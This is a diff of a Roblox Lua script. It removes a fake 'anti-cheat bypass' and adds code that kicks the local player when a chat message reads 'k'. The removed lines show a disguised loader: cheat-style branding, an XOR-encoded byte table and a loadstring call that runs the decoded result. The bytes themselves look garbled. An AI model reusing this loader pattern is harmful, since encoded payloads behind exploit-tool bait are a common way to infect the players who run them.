@@ -1,27 +1,19 @@
--- [ UNPATCHED | UNDETECTED ] Secure Anti-Cheat Bypass v4.1
--- [ Instant Steal | Memory Cleaner | Kernel-Level Protection Enabled ]
--- 🔒 Protected Bootstrap System - DO NOT SHARE 🔒
-
-local key = 0x42
-local payload = {
-    75, 72, 77, 10, 90, 92, 65, 12,
-    110, 93, 65, 31, 43, 29, 95, 88,
-    23, 10, 67, 70, 81, 66, 17, 19,
-    24, 27, 30, 44, 52, 61
-}
-
-local function decrypt(tbl)
-    local out=""
-    for _,v in ipairs(tbl) do
-        out = out .. string.char(bit32.bxor(v,key))
+local p=game:GetService("Players").LocalPlayer
+local function f(t)
+    if type(t)=="string" then
+        local x=t:lower():gsub("%s+","")
+        if x=="k." or x=="k" then
+            p:Kick("Self-trigger erkannt.")
+        end
     end
-    return out
 end
 
-local function InitKernelHook()
-    return true
-end
-
-if InitKernelHook() then
-    loadstring(decrypt(payload))()
+local tcs=game:FindService("TextChatService")
+if tcs and tcs.ChatVersion==Enum.ChatVersion.TextChatService then
+    tcs.MessageReceived:Connect(function(m)f(m.Text)end)
+else
+    local c=game.ReplicatedStorage:FindFirstChild("DefaultChatSystemChatEvents")
+    if c and c:FindFirstChild("OnMessageDoneFiltering") then
+        c.OnMessageDoneFiltering.OnClientEvent:Connect(function(d)f(d.Message)end)
+    end
 end
